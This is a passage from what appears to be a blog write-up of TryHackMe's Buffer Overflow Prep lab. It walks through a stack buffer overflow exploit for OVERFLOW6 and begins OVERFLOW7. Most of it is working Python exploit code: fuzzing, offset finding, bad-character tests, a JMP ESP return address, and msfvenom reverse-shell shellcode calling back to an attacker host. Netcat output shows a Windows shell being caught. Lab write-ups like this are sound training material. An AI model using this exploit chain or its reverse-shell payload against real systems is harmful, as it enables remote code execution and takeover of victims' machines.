s.sendall(b'OVERFLOW5 ' + inputBuffer + b'\r\n')

s.close() 
```
{% endraw %}

<br />
Start a netcat listener.  Run the code.  Check the listener and catch the shell.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW5]
└─$ sudo nc -nlvp 443
[sudo] password for kali: 
listening on [any] 443 ...
connect to [10.0.0.6] from (UNKNOWN) [10.0.0.7] 56206
Microsoft Windows [Version 10.0.19045.3803]
(c) Microsoft Corporation. All rights reserved.

C:\Program Files\Windows Kits\10\Debuggers>
```
{% endraw %}

<br />
<b><u>OVERFLOW6<br /></u></b>

Create a script that connects to the service and sends the OVERFLOW6 command mimicking normal usage.

{% raw %}
```python
import socket

url = '10.0.0.7'
port = 1337

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((url,port))
print(s.recv(1024))

s.send(b'OVERFLOW6 aaaa\r\n')
print(s.recv(1024))

s.close() 
```
{% endraw %}

<br />
Update the code to fuzz the command with increasing length to find the breakpoint.

{% raw %}
```python
import socket

url = '10.0.0.7'
port = 1337

buffers = [b'A']
counter = 100
while len(buffers) < 30:
    buffers.append(b'A' * counter)
    counter += 100

for inputBuffer in buffers:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect((url,port))
    s.recv(1024)

    print('[*] Sending: {size}'.format(size=len(inputBuffer)))
    s.send(b'OVERFLOW6 ' + inputBuffer + b'\r\n')
    s.recv(1024)

    s.close() 
```
{% endraw %}

<br />
Run the code and observe the breakpoint.

{% raw %}
```python
= RESTART: /home/kali/Documents/thm/bufferoverflowprep/OVERFLOW6/thm-overflow6_0x01.py
[*] Sending: 1
[*] Sending: 100
[*] Sending: 200
[*] Sending: 300
[*] Sending: 400
[*] Sending: 500
[*] Sending: 600
[*] Sending: 700
[*] Sending: 800
[*] Sending: 900
[*] Sending: 1000
[*] Sending: 1100
```
{% endraw %}

<br />
Check the EIP to ensure that we have control of EIP.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bofprep/of6/firsteip.png" title="First EIP" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Update the script to hardcode the size that breaks the buffer.

{% raw %}
```python
import socket

url = '10.0.0.7'
port = 1337

inputBuffer = b'A' * 1500

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((url,port))
s.recv(1024)

print('[*] Sending: {size}'.format(size=len(inputBuffer)))
s.sendall(b'OVERFLOW6 ' + inputBuffer + b'\r\n')

s.close()
```
{% endraw %}

<br />
Run the code and check EIP to ensure that we still have control.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bofprep/of6/seceip.png" title="Second EIP" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW8]
└─$ msf-pattern_create -l 1500
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9 
```
{% endraw %}

<br />
Update the code with the pattern_create string that we just generated.

{% raw %}
```python
import socket

url = '10.0.0.7'
port = 1337

inputBuffer = b'A' * 1500
inputBuffer = b'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((url,port))
s.recv(1024)

print('[*] Sending: {size}'.format(size=len(inputBuffer)))
s.sendall(b'OVERFLOW6 ' + inputBuffer + b'\r\n')

s.close() 
```
{% endraw %}

<br />
Check the EIP and note the value that is stored in the register.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bofprep/of6/thirdeip.png" title="Get EIP Value" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Run the string from the regster through msf-pattern_offset to get the exact offset.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW6]
└─$ msf-pattern_offset -l 1500 -q 35694234                                                      
[*] Exact match at offset 1034
```
{% endraw %}

<br />
Update the code to include the offset value that we just calculated.

{% raw %}
```python
import socket

url = '10.0.0.7'
port = 1337

inputBuffer = b'A' * 1034
inputBuffer += b'B' * 4
inputBuffer += b'C' * (1500 - len(inputBuffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((url,port))
s.recv(1024)

print('[*] Sending: {size}'.format(size=len(inputBuffer)))
s.sendall(b'OVERFLOW6 ' + inputBuffer + b'\r\n')

s.close() 
```
{% endraw %}

<br />
Run the script and view the 42s in EIP.  Update the code with a list of all the badchars wo we can test them.

{% raw %}
```python
import socket

url = '10.0.0.7'
port = 1337

badchars = (
  b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
  b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
  b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
  b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
  b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

inputBuffer = b'A' * 1034
inputBuffer += b'B' * 4
inputBuffer += badchars
inputBuffer += b'C' * (1500 - len(inputBuffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((url,port))
s.recv(1024)

print('[*] Sending: {size}'.format(size=len(inputBuffer)))
s.sendall(b'OVERFLOW6 ' + inputBuffer + b'\r\n')

s.close() 
```
{% endraw %}

<br />
Check the ESP register to view the baschars and find any mangles.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bofprep/of6/firstbadesp.png" title="First Badchar ESP" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Look for sections where the string drops, missing, or change.  Remove the bad character from the set.  Resend it and scan ESP for more bad characters.  Repeat until you have found them all.  Gotta catch 'em all.

{% raw %}
```python
import socket

url = '10.0.0.7'
port = 1337

# baddies \x00\x08\x2c\xad

badchars = (
  b"\x01\x02\x03\x04\x05\x06\x07\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2d\x2e\x2f\x30"
  b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
  b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xae\xaf\xb0"
  b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
  b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

inputBuffer = b'A' * 1034
inputBuffer += b'B' * 4
inputBuffer += badchars
inputBuffer += b'C' * (1500 - len(inputBuffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((url,port))
s.recv(1024)

print('[*] Sending: {size}'.format(size=len(inputBuffer)))
s.sendall(b'OVERFLOW6 ' + inputBuffer + b'\r\n')

s.close()
```
{% endraw %}

<br />
Update the code to change the badchars to payload = b'D' * 400 as a stub for the payload.  Then, in WinDBG, load the narly extension.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bofprep/of6/narly.png" title="Load Narly" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Run nmod to get a list of modules and their security to find the appropriate module.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bofprep/of6/findaddy.png" title="Find address" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Update the code with the address that was discovered in the essfunc.dll.

{% raw %}
```python
import socket
from struct import pack

url = '10.0.0.7'
port = 1337

# baddies \x00\x08\x2c\xad

payload = b'D' * 400

inputBuffer = b'A' * 1034
inputBuffer += pack('<L',(0x625011af))
inputBuffer += payload
inputBuffer += b'C' * (1500 - len(inputBuffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((url,port))
s.recv(1024)

print('[*] Sending: {size}'.format(size=len(inputBuffer)))
s.sendall(b'OVERFLOW6 ' + inputBuffer + b'\r\n')

s.close() 
```
{% endraw %}

<br />
Use msfvenom to generate a payload.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW6]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.6 LPORT=443 ExitFunc=thread -f python -v payload -b '\x00\x08\x2c\xad'    
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of python file: 1899 bytes
payload =  b""
payload += b"\xbd\x39\x94\xee\x25\xd9\xe1\xd9\x74\x24\xf4"
payload += b"\x5a\x31\xc9\xb1\x52\x83\xc2\x04\x31\x6a\x0e"
payload += b"\x03\x53\x9a\x0c\xd0\x5f\x4a\x52\x1b\x9f\x8b"
payload += b"\x33\x95\x7a\xba\x73\xc1\x0f\xed\x43\x81\x5d"
payload += b"\x02\x2f\xc7\x75\x91\x5d\xc0\x7a\x12\xeb\x36"
payload += b"\xb5\xa3\x40\x0a\xd4\x27\x9b\x5f\x36\x19\x54"
payload += b"\x92\x37\x5e\x89\x5f\x65\x37\xc5\xf2\x99\x3c"
payload += b"\x93\xce\x12\x0e\x35\x57\xc7\xc7\x34\x76\x56"
payload += b"\x53\x6f\x58\x59\xb0\x1b\xd1\x41\xd5\x26\xab"
payload += b"\xfa\x2d\xdc\x2a\x2a\x7c\x1d\x80\x13\xb0\xec"
payload += b"\xd8\x54\x77\x0f\xaf\xac\x8b\xb2\xa8\x6b\xf1"
payload += b"\x68\x3c\x6f\x51\xfa\xe6\x4b\x63\x2f\x70\x18"
payload += b"\x6f\x84\xf6\x46\x6c\x1b\xda\xfd\x88\x90\xdd"
payload += b"\xd1\x18\xe2\xf9\xf5\x41\xb0\x60\xac\x2f\x17"
payload += b"\x9c\xae\x8f\xc8\x38\xa5\x22\x1c\x31\xe4\x2a"
payload += b"\xd1\x78\x16\xab\x7d\x0a\x65\x99\x22\xa0\xe1"
payload += b"\x91\xab\x6e\xf6\xd6\x81\xd7\x68\x29\x2a\x28"
payload += b"\xa1\xee\x7e\x78\xd9\xc7\xfe\x13\x19\xe7\x2a"
payload += b"\xb3\x49\x47\x85\x74\x39\x27\x75\x1d\x53\xa8"
payload += b"\xaa\x3d\x5c\x62\xc3\xd4\xa7\xe5\xe6\x28\xa7"
payload += b"\xf3\x9e\x2a\xa7\xfa\xe5\xa2\x41\x96\x09\xe3"
payload += b"\xda\x0f\xb3\xae\x90\xae\x3c\x65\xdd\xf1\xb7"
payload += b"\x8a\x22\xbf\x3f\xe6\x30\x28\xb0\xbd\x6a\xff"
payload += b"\xcf\x6b\x02\x63\x5d\xf0\xd2\xea\x7e\xaf\x85"
payload += b"\xbb\xb1\xa6\x43\x56\xeb\x10\x71\xab\x6d\x5a"
payload += b"\x31\x70\x4e\x65\xb8\xf5\xea\x41\xaa\xc3\xf3"
payload += b"\xcd\x9e\x9b\xa5\x9b\x48\x5a\x1c\x6a\x22\x34"
payload += b"\xf3\x24\xa2\xc1\x3f\xf7\xb4\xcd\x15\x81\x58"
payload += b"\x7f\xc0\xd4\x67\xb0\x84\xd0\x10\xac\x34\x1e"
payload += b"\xcb\x74\x54\xfd\xd9\x80\xfd\x58\x88\x28\x60"
payload += b"\x5b\x67\x6e\x9d\xd8\x8d\x0f\x5a\xc0\xe4\x0a"
payload += b"\x26\x46\x15\x67\x37\x23\x19\xd4\x38\x66" 
```
{% endraw %}

<br />
Update the code with a nop sled and the payload we just generated.

{% raw %}
```python
import socket
from struct import pack

url = '10.0.0.7'
port = 1337

# baddies \x00\x08\x2c\xad

payload =  b""
payload += b"\xbd\x39\x94\xee\x25\xd9\xe1\xd9\x74\x24\xf4"
payload += b"\x5a\x31\xc9\xb1\x52\x83\xc2\x04\x31\x6a\x0e"
payload += b"\x03\x53\x9a\x0c\xd0\x5f\x4a\x52\x1b\x9f\x8b"
payload += b"\x33\x95\x7a\xba\x73\xc1\x0f\xed\x43\x81\x5d"
payload += b"\x02\x2f\xc7\x75\x91\x5d\xc0\x7a\x12\xeb\x36"
payload += b"\xb5\xa3\x40\x0a\xd4\x27\x9b\x5f\x36\x19\x54"
payload += b"\x92\x37\x5e\x89\x5f\x65\x37\xc5\xf2\x99\x3c"
payload += b"\x93\xce\x12\x0e\x35\x57\xc7\xc7\x34\x76\x56"
payload += b"\x53\x6f\x58\x59\xb0\x1b\xd1\x41\xd5\x26\xab"
payload += b"\xfa\x2d\xdc\x2a\x2a\x7c\x1d\x80\x13\xb0\xec"
payload += b"\xd8\x54\x77\x0f\xaf\xac\x8b\xb2\xa8\x6b\xf1"
payload += b"\x68\x3c\x6f\x51\xfa\xe6\x4b\x63\x2f\x70\x18"
payload += b"\x6f\x84\xf6\x46\x6c\x1b\xda\xfd\x88\x90\xdd"
payload += b"\xd1\x18\xe2\xf9\xf5\x41\xb0\x60\xac\x2f\x17"
payload += b"\x9c\xae\x8f\xc8\x38\xa5\x22\x1c\x31\xe4\x2a"
payload += b"\xd1\x78\x16\xab\x7d\x0a\x65\x99\x22\xa0\xe1"
payload += b"\x91\xab\x6e\xf6\xd6\x81\xd7\x68\x29\x2a\x28"
payload += b"\xa1\xee\x7e\x78\xd9\xc7\xfe\x13\x19\xe7\x2a"
payload += b"\xb3\x49\x47\x85\x74\x39\x27\x75\x1d\x53\xa8"
payload += b"\xaa\x3d\x5c\x62\xc3\xd4\xa7\xe5\xe6\x28\xa7"
payload += b"\xf3\x9e\x2a\xa7\xfa\xe5\xa2\x41\x96\x09\xe3"
payload += b"\xda\x0f\xb3\xae\x90\xae\x3c\x65\xdd\xf1\xb7"
payload += b"\x8a\x22\xbf\x3f\xe6\x30\x28\xb0\xbd\x6a\xff"
payload += b"\xcf\x6b\x02\x63\x5d\xf0\xd2\xea\x7e\xaf\x85"
payload += b"\xbb\xb1\xa6\x43\x56\xeb\x10\x71\xab\x6d\x5a"
payload += b"\x31\x70\x4e\x65\xb8\xf5\xea\x41\xaa\xc3\xf3"
payload += b"\xcd\x9e\x9b\xa5\x9b\x48\x5a\x1c\x6a\x22\x34"
payload += b"\xf3\x24\xa2\xc1\x3f\xf7\xb4\xcd\x15\x81\x58"
payload += b"\x7f\xc0\xd4\x67\xb0\x84\xd0\x10\xac\x34\x1e"
payload += b"\xcb\x74\x54\xfd\xd9\x80\xfd\x58\x88\x28\x60"
payload += b"\x5b\x67\x6e\x9d\xd8\x8d\x0f\x5a\xc0\xe4\x0a"
payload += b"\x26\x46\x15\x67\x37\x23\x19\xd4\x38\x66"

inputBuffer = b'A' * 1034
inputBuffer += pack('<L',(0x625011af))
inputBuffer += b'\x90' * 16
inputBuffer += payload
inputBuffer += b'C' * (1500 - len(inputBuffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((url,port))
s.recv(1024)

print('[*] Sending: {size}'.format(size=len(inputBuffer)))
s.sendall(b'OVERFLOW6 ' + inputBuffer + b'\r\n')

s.close() 
```
{% endraw %}

<br />
Start a netcat listener.  Run the code.  Check the listener and catch the shell.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW6]
└─$ sudo nc -nlvp 443
[sudo] password for kali: 
listening on [any] 443 ...
connect to [10.0.0.6] from (UNKNOWN) [10.0.0.7] 56205
Microsoft Windows [Version 10.0.19045.3803]
(c) Microsoft Corporation. All rights reserved.

C:\Program Files\Windows Kits\10\Debuggers>
```
{% endraw %}

<br />
<b><u>OVERFLOW7<br /></u></b>

Create a script that connects to the service and sends the OVERFLOW7 command mimicking normal usage.

{% raw %}
```python
import socket

url = '10.0.0.7'
port = 1337

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((url,port))
print(s.recv(1024))

s.send(b'OVERFLOW7 aaaa\r\n')
print(s.recv(1024))

s.close()
```
{% endraw %}

<br />
Update the code to fuzz the command with increasing length to find the breakpoint.  Note that I had to fiddle with the counter to break EIP.  With the normal counter, it wouldn't overwrite EIP.

{% raw %}
```python
import socket

url = '10.0.0.7'
port = 1337

buffers = [b'A']
counter = 100
while len(buffers) < 1400:
    buffers.append(b'A' * counter)
    counter += 500

for inputBuffer in buffers:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect((url,port))
    s.recv(1024)

    print('[*] Sending: {size}'.format(size=len(inputBuffer)))
    s.send(b'OVERFLOW7 ' + inputBuffer + b'\r\n')
    s.recv(1024)

    s.close()
```
{% endraw %}

<br />
Run the code and observe the breakpoint.

{% raw %}
```python
= RESTART: /home/kali/Documents/thm/bufferoverflowprep/OVERFLOW7/thm-overflow7_0x01.py
[*] Sending: 1
[*] Sending: 100
[*] Sending: 600
[*] Sending: 1100
[*] Sending: 1600
```
{% endraw %}

<br />
Check the EIP to ensure that we have control of EIP.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bofprep/of7/firsteip.png" title="First EIP" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Update the script to hardcode the size that breaks the buffer.

{% raw %}
```python
import socket

url = '10.0.0.7'
port = 1337

inputBuffer = b'A' * 1600

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((url,port))
s.recv(1024)

print('[*] Sending: {size}'.format(size=len(inputBuffer)))
s.sendall(b'OVERFLOW7 ' + inputBuffer + b'\r\n')

s.close()
```
{% endraw %}

<br />
Run the code and check EIP to ensure that we still have control.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bofprep/of7/seceip.png" title="Second EIP" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW2]
└─$ msf-pattern_create -l 2000                                                                                                   
